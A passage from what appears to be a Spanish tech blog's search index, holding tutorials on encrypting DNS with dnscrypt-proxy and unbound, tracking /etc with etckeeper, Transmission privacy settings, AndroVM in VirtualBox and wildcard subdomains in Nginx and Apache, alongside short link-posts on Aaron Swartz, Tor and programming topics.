<0daydigestATpureftpd.org>;' gpg: AVISO: ¡Esta clave no está certificada por una firma de confianza! gpg: No hay indicios de que la firma pertenezca al propietario. Huellas dactilares de la clave primaria: 89F7 B830 0E87 E03C 52B0 5289 926B C517 1CDE A439 Descomprimimos el paquete y lo compilamos: bash $ tar xvjf dnscrypt-proxy-1.2.0.tar.bz2 $ cd dnscrypt-proxy-1.2.0 $ ./configure $ make -j2 Antes de instalarlo podemos realizar algunos tests: bash $ cd src/libnacl $ make -j2 test $ cd ../.. Lo instalamos: bash $ sudo make install Uso La forma más sencilla de utilizarlo es ejecutar: bash $ sudo dnscrypt-proxy --daemonize Acto seguido modificamos la dirección IP del servidor DNS en los parámetros de la conexión. Podemos editar el fichero /etc/resolv.con y poner: bash nameserver 127.0.0.1 Si vemos un aviso dentro del fichero que nos dice que los cambios no serán permanentes, y queremos que lo sean, deberemos modificar la IP del servidor DNS desde la configuración de la red en propiedades del sistema. Probamos que el servicio funciona: ```bash $ dig opendns.com ; <<>> DiG 9.8.1-P1 <<>> opendns.com ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 630 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 8192 ;; QUESTION SECTION: ;opendns.com. IN A ;; ANSWER SECTION: opendns.com. 30 IN A 67.215.92.211 ;; Query time: 91 msec ;; SERVER: 127.0.0.1#53(127.0.0.1) ;; WHEN: Thu Jan 17 17:35:51 2013 ;; MSG SIZE rcvd: 56 ``` ```bash $ nslookup opendns.com Server: 127.0.0.1 Address: 127.0.0.1#53 Non-authoritative answer: Name: opendns.com Address: 67.215.92.211 ``` ```bash $ nslookup opendns.com localhost Server: localhost Address: 127.0.0.1#53 Non-authoritative answer: Name: opendns.com Address: 67.215.92.211 ``` ```bash $ drill opendns.com ;; ->>HEADER<<- opcode: QUERY, rcode: NOERROR, id: 31633 ;; flags: qr rd ra ; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;; opendns.com. IN A ;; ANSWER SECTION: opendns.com. 23 IN A 67.215.92.211 ;; AUTHORITY SECTION: ;; ADDITIONAL SECTION: ;; Query time: 76 msec ;; SERVER: 127.0.0.1 ;; WHEN: Thu Jan 17 18:43:31 2013 ;; MSG SIZE rcvd: 45 ``` unbound : caché DNS DNSCrypt únicamente cifra las peticiones DNS hasta nuestro DNS primario, pero no mantiene una caché de las mismas. Podemos optimizar las consultas utilizando un sistema de caché DNS como unbound . Su instalación es sencilla, ya que se encuentra en los repositorios. Una vez instalado, necesitaremos hacer dos cambios. Primero, ejecutar DNSCrypt en otro puerto, por ejemplo el 40: bash $ sudo dnscrypt-proxy --daemonize --local-address=127.0.0.1:40 Y segundo, configuramos unbound para que las consultas sean redirigidas a través de dnscrypt-proxy en ese puerto. Añadimos al archivo de configuración /etc/unbound/unbound.conf : ```bash username: \"unbound\" directory: \"/etc/unbound\" use-syslog: yes do-not-query-localhost: no forward-zone: name: \".\" forward-addr: 127.0.0.1@40 ``` Comprobamos que la caché funciona correctamente haciendo dos consultas seguidas al mismo dominio, veremos que la segunda vez tarda 0 ms: bash $ dig opendns.com ... ;; Query time: 0 msec Actualizado el 15 de septiembre de 2013 Si queremos utilizar otros servidores DNS tenemos algunas alternativas más: ClouDNS es un proveedor australiano que admite el cifrado de DNS para conectarse a sus servidores. Ejecutamos dnscrypt-proxy : bash $ sudo dnscrypt-proxy -d -a 127.0.0.1:40 -r 113.20.6.2:443 $ sudo dnscrypt-proxy -d -a 127.0.0.2:41 -r 113.20.8.17:443 Configuración de unbound : bash do-not-query-localhost: no forward-zone: name: \".\" forward-addr: 127.0.0.1@40 forward-addr: 127.0.0.2@41 Por otro lado, OpenNIC project nos dice los servidores DNS abiertos y seguros más cercanos. Actualizado el 10 de mayo de 2014 Para instalar dnscrypt en Ubuntu Trusty Tahr (14.04) necesitaremos instalar previamente la librería libsodium . Para facilitar la instalación en varios equipos, he creado los paquetes .deb para libsodium y dnscrypt . DNSSEC unbound está configurado por defecto para utilizar DNSSEC, pero parece que OpenDNS aún no lo soporta , por lo que deberemos comentar la siguiente línea en el fichero /etc/unbound/unbound.conf : bash auto-trust-anchor-file: \"/var/lib/unbound/root.key\" Sólo queda reiniciar el servicio: bash $ sudo service unbound restart Referencias » dnscrypt-proxy » Introducing DNSCrypt (Preview Release) » Como cifrar el trafico DNS y saltarse algunos filtros de navegacion web implementados por algunos ISP","tags":"admin","url":"https://karpoke.ignaciocano.com/2013/01/17/cifrando-el-trafico-dns/","loc":"https://karpoke.ignaciocano.com/2013/01/17/cifrando-el-trafico-dns/"},{"title":"EL CASO DE AARON SWARTZ","text":"Ayer se suicidó Aaron Swartz, uno de los activistas de Internet que hicieron de la libertad de expresión y un internet abierto una de sus banderas; parte gigante del freno a SOPA/PIPA, como hacker había colaborado en la especificación RSS a los 14 años y hasta cofundado REDDIT¦ tal vez la suma de sus antecedentes depresivos y la decisión del Gobierno de USA de perseguirlo y hacer un ejemplo con su caso lo llevaron a suicidarse. mariano | uberbin.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/01/13/el-caso-de-aaron-swartz/","loc":"https://karpoke.ignaciocano.com/2013/01/13/el-caso-de-aaron-swartz/"},{"title":"High-Resolution Mandelbrot in Obfuscated Python","text":"Here's a followup to last month's post about Penrose Tiling in Obfuscated Python. The Mandelbrot set is a traditional favorite among authors of obfuscated code. You can find obfuscated code in C, Perl, Haskell, Python and many other languages. Nearly all examples render the Mandelbrot set as ASCII art. The following Python script, on the other hand, begins as ASCII art: python _ = ( 255, lambda V ,B,c :c and Y(V*V+B,B, c -1)if(abs(V)&lt;6)else ( 2+c-4_abs(V)*_-0.4)/i ) ;v, x=1500,1000;C=range(v*x );import struct;P=struct.pack;M,\\ j ='<qiihhhh ',open('M.bmp','wb').write for X in j('BM'+P(M,v_x_3+26,26,12,v,x,1,24))or C: i ,Y=_;j(P('BBB',_(lambda T:(T_80+T__9 _i-950_T **99,T*70-880*T*_18+701_ T __9 ,T*i**(1-T*_45_2)))(sum( [ Y(0,(A%3/3.+X%v+(X/v+ A/3/3.-x/2)/1j)*2.5 /x -2.7,i)**2 for \\ A in C [:9]]) /9) ) ) » Jeff Preshing | preshing.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/01/06/high-resolution-mandelbrot-in-obfuscated-python/","loc":"https://karpoke.ignaciocano.com/2013/01/06/high-resolution-mandelbrot-in-obfuscated-python/"},{"title":"Sin dejar rastro, el ciberactivista paranoico","text":"Ser ciberactivista cada día es más peligroso en este país donde asistimos boquiabiertos a la continua detención de personas que han participado en manifestaciones¦ o que iban a hacerlo como sucedió con las detenciones preventivas de miembros de la Coordinadora 25S. Que no tenemos nada que ocultar es un pensamiento generalizado, pero no es cierto, máxime cuando se pretende criminalizar hasta la convocatoria de manifestaciones a través de las redes sociales. » bofhers.wordpress.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/30/sin-dejar-rastro-el-ciberactivista-paranoico/","loc":"https://karpoke.ignaciocano.com/2012/12/30/sin-dejar-rastro-el-ciberactivista-paranoico/"},{"title":"Kbuild: the Linux Kernel Build System","text":"One amazing thing about Linux is that the same code base is used for a different range of computing systems, from supercomputers to very tiny embedded devices. If you stop for a second and think about it, Linux is probably the only OS that has a unified code base. For example, Microsoft and Apple use different kernels for their desktop and mobile OS versions (Windows NT/Windows CE and OS X/iOS). Two of the reasons this is possible on Linux are that the kernel has many abstraction layers and levels of indirection and because its build system allows for creating highly customized kernel binary images. Javier Martínez Canilles | linuxjournal.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/30/kbuild-the-linux-kernel-build-system/","loc":"https://karpoke.ignaciocano.com/2012/12/30/kbuild-the-linux-kernel-build-system/"},{"title":"100 Diagrams That Changed the World","text":"Since the dawn of recorded history, we've been using visual depictions to map the Earth, order the heavens, make sense of time, dissect the human body, organize the natural world, perform music, and even concretize abstract concepts like consciousness and love. 100 Diagrams That Changed the World (UK; public library) by investigative journalist and documentarian Scott Christianson chronicles the history of our evolving understanding of the world through humanity's most groundbreaking sketches, illustrations, and drawings, ranging from cave paintings to The Rosetta Stone to Moses Harris's color wheel to Tim Berners-Lee's flowchart for a \"mesh\" information management system, the original blueprint for the world wide web. Maria Popova | brainpickings.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/30/100-diagrams-that-changed-the-world/","loc":"https://karpoke.ignaciocano.com/2012/12/30/100-diagrams-that-changed-the-world/"},{"title":"Solucionado el error \"Fontconfig warning: reading configurations from ~/.fonts.conf is deprecated.\" en Ubuntu","text":"En Ubuntu, si tenemos el archivo de configuración ~./fonts.conf y lanzamos una aplicación que lo utilice, es posible que nos aparezca un error como el siguiente: bash Fontconfig warning: \"/etc/fonts/conf.d/50-user.conf\", line 9: reading configurations from ~/.fonts.conf is deprecated. El motivo, tal como apunta Githlar en este foro , es que ~/.fonts.conf será eliminado en el futuro. La solución pasa por mover el fichero a su nuevo emplazamiento (es posible que necesitemos primero crear el directorio destino): bash $ mkdir -p .config/fontconfig $ mv -i ~/.fonts.conf ~/.config/fontconfig/fonts.conf Referencias » Fontconfig warning » better \\~/.fonts.conf deprecation warning","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/12/23/solucionado-el-error-fontconfig-warning-reading-configurations-from-fonts-conf-is-deprecated-en-ubuntu/","loc":"https://karpoke.ignaciocano.com/2012/12/23/solucionado-el-error-fontconfig-warning-reading-configurations-from-fonts-conf-is-deprecated-en-ubuntu/"},{"title":"etckeeper, control de versiones del directorio /etc","text":"etckeeper permite utilizar una herramienta de control de versiones para registrar los cambios hechos en los ficheros del directorio /etc . Se pueden utilizar varias herramientas de control de versiones, como Bazaar, Git, Mercurial o Darcs. Aunque puede ser de gran ayuda tener un historial de los cambios en los ficheros del directorio /etc , no debemos olvidar que puede que se estén copiando ficheros que deberían permanecer secretos, como por ejemplo /etc/shadow . Al repositorio sólo puede acceder el administrador del sistema, pero deberemos tener en cuenta esto si, por ejemplo, copiamos el repositorio. Instalación En este caso, utilizaremos Bazaar. Instalamos los paquetes necesarios: bash $ sudo aptitude install etckeeper bzr Configuración Editamos el fichero /etc/etckeeper/etckeeper.conf y comprobamos que la siguiente línea no está comentada: bash VCS=\"bzr\" Si utilizamos aptitude , también podemos modificar el valor de HIGHLEVEL_PACKAGE_MANAGER : bash HIGHLEVEL_PACKAGE_MANAGER=aptitude Inicialización Lo primero que hay que hacer antes que nada es inicializar el repositorio. Ejecutamos: bash $ sudo etckeeper init Del mismo modo, podemos dejar de usar el control de versiones y borrar toda la información guardada ejecutando: bash $ sudo etckeeper uninit Uso Supongamos que acabamos de actualizar el fichero /etc/hosts . Para comprobar los archivos modificados ejecutamos: bash $ sudo bzr status /etc modified: hosts unknown: X11/core Para registrar ( commit ) los cambios ejecutamos: bash $ sudo etckeeper commit \"Updated hphosts\" Committing to: /etc/ modificado hosts Committed revision 2. Comprobar el historial de cambios, podemos especiar un directorio o un fichero concreto: ```bash $ sudo bzr log /etc/hosts revno: 2 committer: karpoke branch nick: localhost /etc repository timestamp: Fri 2012-12-21 15:28:08 +0100 message: Updated hphosts revno: 1 committer: karpoke branch nick: localhost /etc repository timestamp: Fri 2012-12-21 15:13:09 +0100 message: Initial commit ``` Si queremos revertir los cambios, debemos especificar el número de versión al que queremos volver. También podemos especificar un directorio o un fichero: bash $ sudo bzr revert --revision 2 /etc/hosts Alertas y mensajes de error etckeeper está configurado por defecto para ejecutarse automáticamente una vez al día y tras cada actualización, instalación o borrado de paquetes del sistema. En este caso, es posible que, si no hay ningún cambio en los ficheros de /etc , nos aparezca un mensaje de error como el siguiente: bash bzr: ERROR: No changes to commit. Please 'bzr add' the files you want to commit, or use --unchanged to force an empty commit. Si queremos evitarlo, basta editar la siguiente línea en el fichero de configuración: bash BZR_COMMIT_OPTIONS=\"--unchanged\" Avisos de rkhunter Si tenemos instalado rkhunter , podemos añadir las siguientes líneas al fichero de configuración para evitar que nos lleguen avisos de los ficheros y directorios utilizados por etckeeper: bash ALLOWHIDDENDIR=\"/etc/.bzr\" ALLOWHIDDENFILE=\"/etc/.etckeeper\" ALLOWHIDDENFILE=\"/etc/.bzrignore\" Referencias » Using Version Control For Your /etc Directory With etckeeper And Bazaar On Debian Squeeze","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/12/21/etckeeper-control-de-versiones-del-directorio-etc/","loc":"https://karpoke.ignaciocano.com/2012/12/21/etckeeper-control-de-versiones-del-directorio-etc/"},{"title":"Descargando torrents en modo paranoico con Transmission","text":"Si utilizamos Transmission para descargar torrents podemos activar dos características interesantes: cifrado de la conexión y uso de listas de bloqueo de IPs. Vamos al menú Editar > Preferencias > Privacidad: Lista de bloqueos Activar lista de bloqueo: http://list.iblocklist.com/?list=bt_level1&fileformat=p2p&archiveformat=gz Activar actualizaciones automáticas Privacidad Modo de cifrado: Requerir cifrado Usar PEX para buscar más pares Usar DHT para buscar más pares Usar el descubridor de pares locales para buscar más pares Actualizado el 12 de abril de 2015 En las versiones actuales de Transmission, las opciones de PEX y DHT están en la pestaña de Red. Las listas de bloqueo se pueden obtener de iblocklist.com . Éste es un servicio que recopila listados de IPs, disponibles en diferentes formatos, y que puede utilizarse con varios programas, incluyendo gestores de descargas, para bloquear dichas direcciones. Una de las listas más utilizadas es ésta . Contiene un listado de IPs asociadas a gobiernos, compañías u organizaciones en contra de la compartición de archivos y de las redes P2P. Por otro lado, DHT se utiliza para encontrar direcciones IP de las que descargar los mismos archivos sin comunicárselo al rastreador central. Asímismo, PEX también se utiliza para encontrar direcciones IP consultando a direcciones IP a las que ya estemos conectados. Referencias » ¿El futuro de BitTorrent? DHT, PEX y Enlaces Magnéticos explicados. http://www.bittorrentyp2p.com/%C2%BFel-futuro-de-bittorrent-dht-pex-y-enlaces-magneticos-explicados","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/12/19/descargando-torrents-en-modo-paranoico-con-transmission/","loc":"https://karpoke.ignaciocano.com/2012/12/19/descargando-torrents-en-modo-paranoico-con-transmission/"},{"title":"Does rooting your device void your statutory warranty?","text":"No. Just the fact that you modified or changed the software of your device, is not a sufficient reason to void your statutory warranty. As long as you have bought the device as a consumer in the European Union. Matija Å uklje, Carlo Piana | fsfe.org | Ismael Callejas elandroidelibre.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/19/does-rooting-your-device-void-your-statutory-warranty/","loc":"https://karpoke.ignaciocano.com/2012/12/19/does-rooting-your-device-void-your-statutory-warranty/"},{"title":"10 interpretaciones de los viajes en el tiempo y visiones del futuro en la ciencia ficción","text":"Desde que en 1781 apareció la obra \"Año 7603\", primera en la que se habla de un viaje en el tiempo, mucho se ha escrito sobre el tema en la ciencia ficción, sobre posibles paradojas, sobre la posibilidad o no de cambiar los acontecimientos, etcétera. En cada obra, los efectos de dichos viajes se interpretan de forma distinta. Y eso es lo que vamos a ver aquí, 10 interpretaciones en la ciencia ficción sobre lo que puede pasar cuando se conoce el futuro, ya sea conocido por viajes en el tiempo, predicciones u otros medios. » zurditorium.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/19/10-interpretaciones-de-los-viajes-en-el-tiempo-y-visiones-del-futuro-en-la-ciencia-ficcion/","loc":"https://karpoke.ignaciocano.com/2012/12/19/10-interpretaciones-de-los-viajes-en-el-tiempo-y-visiones-del-futuro-en-la-ciencia-ficcion/"},{"title":"Noam Chomsky. La lingüistica, la informática y el activismo","text":"En cuanto a la relación de Chomsky con la informática proviene de sus enormes aportaciones a la Teoría de Autómatas y al estudio de los lenguajes formales, donde sus ideas se aplican a la perfección. Dichas aportaciones han resultado elementos indispensables para la construcción de compiladores y traductores que puedan servir de intérpretes válidos entre las órdenes que dan los seres humanos y su correcta recepción y aplicación por máquinas automáticas. Puede decirse que el papel desempeñado por Chomsky ha resultado crucial en este importante campo, pues fue imprescindible para dar el siguiente paso tras los primeros computadores, el ENIAC o el propio ACE de Turing, programados directamente en código binario, de forma que a mediados de 1954 ya influyó en la especificación del borrador The IBM Mathematical Formula Translating System, origen del lenguaje Fortran, y también John Backus adoptó sus reglas para describir la sintaxis de Algol, origen de la notación Backus-Naur. Fernando Cuartero | hablandodeciencia.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/18/noam-chomsky-la-linguistica-la-informatica-y-el-activismo/","loc":"https://karpoke.ignaciocano.com/2012/12/18/noam-chomsky-la-linguistica-la-informatica-y-el-activismo/"},{"title":"10 PRINT CHR$(205.5+RND(1)); : GOTO 10","text":"This book takes a single line of code\"the extremely concise BASIC program for the Commodore 64 inscribed in the title\"and uses it as a lens through which to consider the phenomenon of creative computing and the way computer programs exist in culture. The authors of this collaboratively written book treat code not as merely functional but as a text\"in the case of 10 PRINT, a text that appeared in many different printed sources\"that yields a story about its making, its purpose, its assumptions, and more. They consider randomness and regularity in computing and art, the maze in culture, the popular BASIC programming language, and the highly influential Commodore 64 computer. » 10print.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/18/10-print-chr205-5rnd1-goto-10/","loc":"https://karpoke.ignaciocano.com/2012/12/18/10-print-chr205-5rnd1-goto-10/"},{"title":"¿Cómo funciona la red Tor?","text":"Tor es una red que implementa una técnica llamada Onion Routing (enrutado cebolla en castellano, aunque suena bastante peor), diseñada con vistas a proteger las comunicaciones en la Marina de los Estados Unidos. La ideas es cambiar el modo de enrutado tradicional de Internet para garantizar el anonimato y privacidad de los datos. Guillermo Julián | genbeta.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/18/como-funciona-la-red-tor/","loc":"https://karpoke.ignaciocano.com/2012/12/18/como-funciona-la-red-tor/"},{"title":"El camino a un mejor programador","text":";`El camino a un mejor programador;' es un libro que recopila artículos sobre ingeniería informática escritos por Esteban Manchado Velázquez, Joaquín Caraballo Moreno y Yeray Darias Camacho. La mayoría de los artículos tratan sobre pruebas automáticas de una manera u otra, pero el tema común es mejorar como profesional de la informática. » emanchado.github.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/17/el-camino-a-un-mejor-programador/","loc":"https://karpoke.ignaciocano.com/2012/12/17/el-camino-a-un-mejor-programador/"},{"title":"A successful Git branching model","text":"In this post I present the development model that I've introduced for all of my projects (both at work and private) about a year ago, and which has turned out to be very successful. I've been meaning to write about it for a while now, but I've never really found the time to do so thoroughly, until now. I won't talk about any of the projects' details, merely about the branching strategy and release management. nvie | nvie.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/16/a-successful-git-branching-model/","loc":"https://karpoke.ignaciocano.com/2012/12/16/a-successful-git-branching-model/"},{"title":"Ten Simple Rules for the Open Development of Scientific Software","text":"If you have the choice, embracing an open approach to development has tremendous benefits. It allows you to build on the work of other scientists, and enables others to build on your own efforts. To make the development of open scientific software more rewarding and the experience of using software more positive, the following ten rules are intended to serve as a guide for any computational scientist. Andreas PrliÄ‡1, James B. Procter | ploscompbiol.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/16/ten-simple-rules-for-the-open-development-of-scientific-software/","loc":"https://karpoke.ignaciocano.com/2012/12/16/ten-simple-rules-for-the-open-development-of-scientific-software/"},{"title":"Merge branch 'x86-nuke386-for-linus'","text":"Pull \"Nuke 386-DX/SX support\" from Ingo Molnar: \"This tree removes ancient-386-CPUs support and thus zaps quite a bit of complexity: 24 files changed, 56 insertions(+), 425 deletions(-) ... which complexity has plagued us with extra work whenever we wanted to change SMP primitives, for years. Unfortunately there's a nostalgic cost: your old original 386 DX33 system from early 1991 won't be able to boot modern Linux kernels anymore. Sniff.\" I'm not sentimental. Good riddance. Linus Torvalds | git.kernel.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/16/merge-branch-x86-nuke386-for-linus/","loc":"https://karpoke.ignaciocano.com/2012/12/16/merge-branch-x86-nuke386-for-linus/"},{"title":"Pong cumple 40 años: un videojuego tan antiguo, tan antiguo que ni siquiera era digital","text":"El 29 de noviembre de 1972, hace ahora 40 años, un extraño artilugio salía del taller de Atari, por aquel entonces una jovencísima empresa que pretendía prácticamente inventar un nuevo mercado, con conceptos y aparatos como los videojuegos, las videoconsolas y las máquinas recreativas de videojuegos. Se llamaba Pong y era un enorme armario de madera con un tubo de rayos catódicos en blanco y negro a modo de pantalla, unas palancas a modo de mandos y una ranura en la que echar monedas. Esos fueron los humildes comienzos de una compañía pionera fundada por Nolan Bushnell y Ted Dabney en Estados Unidos el verano de ese mismo año. El juego en sí lo desarrolló Allan Alcorn, un ingeniero cuyo nombre también ha pasado a los anales de la informática y la industria del entretenimiento. Alvy | rtve.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/16/pong-cumple-40-anos-un-videojuego-tan-antiguo-tan-antiguo-que-ni-siquiera-era-digital/","loc":"https://karpoke.ignaciocano.com/2012/12/16/pong-cumple-40-anos-un-videojuego-tan-antiguo-tan-antiguo-que-ni-siquiera-era-digital/"},{"title":"Cómo trabajar con vhdl usando software libre","text":"Las clases de ingeniería electrónica suelen dictarse usando herramientas propietarias, así que siempre paso algunas horas buscando hacer mis trabajos con software libre. Por esta razón, he decidido compartir la siguiente guía. pandacris | usemoslinux.blogspot.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/15/como-trabajar-con-vhdl-usando-software-libre/","loc":"https://karpoke.ignaciocano.com/2012/12/15/como-trabajar-con-vhdl-usando-software-libre/"},{"title":"Jelly Bean con AndroVM en VirtualBox OSE","text":"AndroVM es una máquina virtual para ejecutar Android. Si queremos probarla, lo único que tenemos que hacer es descargarla y configurar VirtualBox OSE para ejecutarla. Descarga Desde la página de descargas nos descargamos el fichero OVA, por ejemplo, vbox86tp version with gapps & houdini (hay varias versiones, pero ésta es la más completa), y el reproductor para nuestra plataforma, por ejemplo Linux 32-bit , que emplearemos si queremos utilizar la aceleración hardware OpenGL. bash $ wget http://androvm.org/Download/androVM_vbox86tp_4.1.1_r4-20121119-gapps-houdini-flash.ova $ wget http://androvm.org/Download/AndroVMplayer-linux32-20121106.tgz Configuración de VirtualBox OSE Vamos a Archivo > Preferencias > Red y creamos un adaptador de red de tipo \"Sólo anfitrión\". Habilitamos, también, el servidor DHCP. Importamos el fichero OVA desde Archivo > Importar servicio virtualizado. Habilitamos la interfaz de red de AndroVM, deshabilitada por defecto. Para ello, vamos a las Preferencias de la máquina virtual > Red > Adaptador 1 y lo conectamos a \"Adaptador sólo anfitrión\". Arranque Iniciamos la máquina virtual y procedemos con la configuración inicial de Android. Aceleración hardware OpenGL Si queremos activar la aceleración hardware OpenGL, abrimos la aplicación AndroVM Configuration, que ya viene instalada, y marcamos la casilla. Guardamos y reiniciamos cuando nos lo pida. El otro archivo que nos hemos bajado, AndroVMplayer, se utiliza para mostrar la máquina virtual y gestionar sus eventos. Reiniciamos la máquina virtual y mientras tanto, ejecutamos este archivo que puede tomar tres parámetros: ancho, alto y densidad. bash $ tar xvzf AndroVMplayer-linux32-20121106.tgz $ cd AndroVMplayer $ ./AndroVMplayer 1024 600 160 Referencias » androvm.org","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/12/15/jelly-bean-con-androvm-en-virtualbox-ose/","loc":"https://karpoke.ignaciocano.com/2012/12/15/jelly-bean-con-androvm-en-virtualbox-ose/"},{"title":"Hacking my vagina","text":"This project has been an astonishing little journey. Many of my previous projects were characterized by an amazing outpouring of effort to build something highly intricate and ultimately invisible. This is the opposite kind of project. A little bit of work and a little custom design to create something new and exciting that I can immediately use in my everyday life. It also happens to be a sex toy. In other words, I wanted to hack something I actually use: my vagina. Beth | scanlime.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/15/hacking-my-vagina/","loc":"https://karpoke.ignaciocano.com/2012/12/15/hacking-my-vagina/"},{"title":"The Big Internet Museum","text":"You are about to enter the Big Internet Museum. Explore an interactive and ever-growing collection about the Internet and its remarkable graphic interface: the World Wide Web. By the way, we don't have a building. The reason is simple: our collection only exists online. Aside from that it's a museum like any other – with curators, a diverse permanent collection, temporary exhibitions, different wings, donations, and more. In the Big Internet Museum you can have your name printed on the wall by submitting a piece to the collection! We might even open a gift shop. There, we've said it. » thebiginternetmuseum.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/15/the-big-internet-museum/","loc":"https://karpoke.ignaciocano.com/2012/12/15/the-big-internet-museum/"},{"title":"2012: What a Year for Linux","text":"2012 has been another year of records for Linux. The operating system is the fastest growing platform across multiple industries and is inspiring new projects every single day. Join us as we review this amazing year and celebrate Linux and its global community of developers, contributors and sponsors. For more information about Linux, please visit linuxfoundation.org and linux.com . Third-party Video and Photo Credits In order of appearance: Technology Academy of Finland Amazon (Kindle) Google (Chromebook) TheLinuxFoundation | youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/15/2012-what-a-year-for-linux/","loc":"https://karpoke.ignaciocano.com/2012/12/15/2012-what-a-year-for-linux/"},{"title":"Subdominios dinámicos en un alojamiento con dominio dinámico en OVH","text":"Lo que se pretende es conseguir una manera rápida y sencilla de poner sitios web online . Una vez configurado el servidor web y el servidor DNS, lo único que tendremos que hacer para tener accesible un nuevo sitio web será colocarlo en un directorio concreto del servidor y podremos acceder a él a través del subdominio con el nombre del directorio. Por ejemplo, si creamos la web web1 , automáticamente será accesible desde web1.example.com . En mi caso concreto, dado que el dominio que apuntará al servidor será un dominio dinámico ( sub.ignaciocano.com ), los sitios web serán accesibles a través de un subdominio de éste. Por ejemplo, web1.sub.ignaciocano.com . Configurar el servidor DNS Se puede utilizar cualquier servidor DNS que permita comodines ( wildcards ) para los subdominios de un dominio. Podemos utilizar el servidor DNS de nuestro dominio principal, o un servidor DNS propio. No sé si debe quedar algún servicio gratuito de dominios dinámicos, ya que servicios como DynDNS o No-IP creo recordar que sólo permiten los comodines en su versión de pago. En mi caso, he configurado el servidor DNS de OVH. En tres sencillos pasos lo tendremos todo listo. Primero, creamos un nuevo dominio tipo DynHOST. Para ello, vamos a Inicio > Hosting > Dominios & DNS > Zona DNS > campo DynHOST: Subdominio: sub IP de destino: Ponemos la IP del servidor Dejamos marcada la casilla para crear un identificador DynHOST Tras validar el primer paso, vamos a crear el identificador DynHOST: Identificador: ignaciocano-identificadordeldominio Subdominio: sub.ignaciocano.com Contraseña: * * * Validamos y ya sólo quedará un último paso. Para que el este DynHOST permita subdominios, deberemos crear un registro CNAME. Vamos a Inicio > Hosting > Dominios & DNS > Zona DNS > campo CNAME: Subdominio: *.sub.ignaciocano.com Destino: sub.ignaciocano.com Validamos y listo. Configurar el servidor web Todos los proyectos estarán ubicados a partir de un directorio común: /home/projects/subdomains . Lo que tenemos que hacer es que el servidor utilice el prefijo del dominio para utilizar la raíz del sitio correcta. Nginx Configurar Nginx para que cualquier subdominio apunte a un directorio concreto es sencillo. Creamos un fichero de configuración para el dominio /etc/nginx/sites-available/sub.ignaciocano.com : bash server { listen 80; server_name sub.ignaciocano.com ~&#94;([&#94;.]+)\\.sub\\.ignaciocano\\.com ; access_log /var/log/nginx/access.sub.ignaciocano.com.log; if ($host ~* &#94;([&#94;.]+)\\.sub\\.ignaciocano\\.com$) { set $subdomain $1; } root /home/projects/subdomains/$subdomain/; } Sólo resta activar el sitio y reiniciar el servidor. Apache Hacer lo propio en Apache es también sencillo. Podemos utilizar mod_rewrite : ```bash ServerName sub.ignaciocano.com ServerAlias *.sub.ignaciocano.com RewriteEngine On RewriteCond %{HTTP_HOST} &#94;([&#94;.]+).sub.ignaciocano.com RewriteCond /home/projects/subdomains/%1 -d RewriteRule &#94;(.*) /%1/$1 [L] ``` O bien vhost_alias , el cual lo simplifica aún más: ```bash ServerName sub.ignaciocano.com ServerAlias *.sub.ignaciocano.com VirtualDocumentRoot /home/projects/subdomains/%1 ``` Actualizado el 14 de febrero de 2015 Si queremos que las conexiones a estos subdominios sean seguras , una opción es crear un certificado con wildcard pero en lugar de hacerlo para el dominio principal, lo debemos hacer para el primer subdominio. En este caso, al crear la petición de firmado, en el campo Common Name deberemos poner *.sub.ignaciocano.com . Hay que tener en cuenta que un certificado con wildcard para el dominio de primer nivel ( *.ignaciocano.com ), no se puede utilizar para estos subdominios de un subdominio , o de lo contrario el navegador nos avisará de que el dominio no coincide con el del certificado: Matching is performed using the matching rules specified by [RFC2459]. If more than one identity of a given type is present in the certificate (e.g., more than one dNSName name, a match in any one of the set is considered acceptable.) Names may contain the wildcard character * which is considered to match any single domain name component or component fragment. E.g., *.a.com matches foo.a.com but not bar.foo.a.com. f*.com matches foo.com but not bar.com. Por último, no estaría demás forzar el uso de HTTPS para estos subdominios: ```bash ServerName sub.ignaciocano.com ServerAlias *.sub.ignaciocano.com RewriteEngine on ReWriteCond %{SERVER_PORT} !&#94;443 \\( RewriteRule &#94;/(.*) https://%{HTTP_HOST}/\\) 1 [NC,R,L] ``` Referencias » Redirect of wildcard subdomain to subfolder » Wildcard subdomain directory names » HTTP over TLS if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] 